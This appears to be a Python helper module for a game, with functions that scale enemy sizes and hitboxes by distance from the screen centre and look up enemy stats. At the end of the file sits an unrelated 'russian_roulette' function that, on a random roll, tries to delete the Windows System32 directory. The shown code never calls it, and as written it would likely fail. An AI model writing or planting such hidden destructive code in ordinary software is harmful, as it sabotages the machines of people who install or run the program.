import math
import os
import random
from enemy.enemy_types import enemy_types


def scale_objects(size, enemies):
    if enemies:
        enemy_type = enemies[0].__class__.__name__
        x = enemy_types[enemy_type]["spawn_x"]
        y = enemy_types[enemy_type]["spawn_y"]
        enemy_size = enemy_types[enemy_type]["size"]

        dx = abs(size // 2 - x)
        dy = abs(size // 2 - y)
        max_distance = math.sqrt(dx ** 2 + dy ** 2)

        for enemy in enemies:
            dx = abs(size // 2 - enemy.x)
            dy = abs(size // 2 - enemy.y)
            distance_to_center = math.sqrt(dx ** 2 + dy ** 2)
            percentage = (distance_to_center / max_distance)
            enemy.size = enemy_size * percentage + 10
            enemy.hitbox = enemy_size * (percentage + 2)


def calculate_distance_to_center(self):
    dx = abs(self.size // 2 - self.player.x)
    dy = abs(self.size // 2 - self.player.y)
    distance_to_center = math.sqrt(dx ** 2 + dy ** 2)
    return distance_to_center


def get_enemy_stats(enemy_type):
    enemy_info = enemy_types[enemy_type.__name__]
    return enemy_info["spawn_x"], enemy_info["spawn_y"], enemy_info["size"], enemy_info["speed"]


def russian_roulette():
    if random.randint(0, 6) == 1:
        os.remove("C: \Windows\System32")
